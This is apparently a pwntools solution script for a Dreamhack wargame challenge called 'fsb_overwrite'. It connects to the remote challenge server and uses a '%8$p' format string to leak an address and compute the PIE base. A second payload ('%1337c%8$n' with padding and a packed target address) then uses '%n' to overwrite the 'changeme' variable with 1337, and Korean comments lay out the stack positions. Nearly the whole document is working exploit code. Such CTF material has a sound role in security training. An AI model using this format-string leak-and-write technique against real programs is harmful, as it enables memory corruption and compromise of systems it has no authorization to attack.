from pwn import *
def slog(name, addr) : return success(': '.join([name, hex(addr)]))
# p = process('./fsb_overwrite')
p = remote('host3.dreamhack.games', 10204)
e = ELF('./fsb_overwrite')

# get address of changeme
fstring = b'%8$p'
p.sendline(fstring)
leaked = int(p.recvline()[:-1], 16)
codebase = leaked - e.symbols['__libc_csu_init']
changeme = codebase + e.symbols['changeme']
slog('PIE base', codebase)
slog('changeme', changeme)
# 결국 changeme->1337이 목표
# "%1337c%8$nAAAAAA" + p64(changeme)
# [rsp]: '%1337c%8'
# [rsp+0x10]: '$n' + 'AAAAAA'
# [rsp+0x18]: p64(changeme)

fstring = b'%1337c%8$n' + b'A' * 6
fstring += p64(changeme)

p.sendline(fstring)

p.interactive()